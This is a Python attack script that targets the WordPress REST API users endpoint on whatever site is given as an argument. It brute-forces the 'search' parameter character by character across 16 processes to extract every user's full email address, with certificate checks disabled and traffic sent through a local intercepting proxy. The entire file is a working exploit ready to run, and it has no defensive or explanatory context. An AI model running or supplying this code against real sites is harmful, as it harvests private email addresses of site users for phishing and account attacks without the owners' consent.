from multiprocessing import Pool
import requests
import string
from functools import partial
import json
import sys
requests.packages.urllib3.disable_warnings()



if len(sys.argv) != 2:
	print(f'USAGE: {sys.argv[0]} <target site root url>')
	sys.exit()

url = sys.argv[1].rstrip('/') + '/wp-json/wp/v2/users'

known_users = {}
user_suffixes = []
current_suffix = '@'
headers = { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136' }
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# def bruteforce_search(txt,proxies):
# 	users = json.loads(requests.get(url, headers=headers , proxies=proxies , verify=False , data=json.dumps({'search':txt})).text)
# 	return (txt, users)


def bruteforce_search( txt, proxies):
    # txt, proxies = args
    try:
        response = requests.get(url, headers=headers, proxies=proxies, verify=False, data=json.dumps({'search': txt}))
        response.raise_for_status()  # Raise an HTTPError for bad responses
        users = response.json()
        return (txt, users)
    except requests.exceptions.RequestException as e:
        print(f"Error processing {txt}: {e}")
        return (txt, [])  # Return an empty list in case of an error
    except json.decoder.JSONDecodeError as e:
        print(f"Error decoding JSON for {txt}: {e}")
        return (txt, [])  # Return an empty list in case of a JSON decoding error



if __name__ == '__main__':
	proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
	search_function = partial(bruteforce_search, proxies=proxies)

	# String comparisons in the DB are case-insensitive, so don't bother with uppercase letters
	dic = string.ascii_lowercase + string.digits + '!#$&\'+\/=?^_`{|}~\.-]+'
	p = Pool(16)

	users = json.loads(requests.get(url,proxies=proxies,verify=False).text)

	# Initial round: Grab all users by their first email domain's character
	suffixes = [current_suffix + c for c in dic]

	for suffix, users in p.imap(search_function, suffixes):
		if len(users) > 0:
			print(users)
			for user in users:
				slug = user['slug']
				print(f'# Added user: {slug}, suffix: {suffix}')
				known_users[user['slug']] = suffix

	# Iterate through all users
	for user in known_users:
		print(f'# Bruteforcing email domain for {user}..')
		foundSomething = True
		while foundSomething:
			foundSomething = False
			suffixes = [known_users[user] + c for c in dic]
			for suffix, users_found in p.imap(search_function, suffixes):
				for user_found in users_found:
					if user_found['slug'] == user:
						print(suffix)
						known_users[user] = suffix
						foundSomething = True
						break

	for user in known_users:
		print(f'# Bruteforcing email ID for {user}..')
		foundSomething = True
		while foundSomething:
			foundSomething = False
			suffixes = [c + known_users[user] for c in dic]
			for suffix, users_found in p.imap(search_function, suffixes):
				for user_found in users_found:
					if user_found['slug'] == user:
						print(suffix)
						known_users[user] = suffix
						foundSomething = True
						break

	print('# Found the following:')
	for user in known_users:
		email = known_users[user]
		print(f'{user} => {email}')
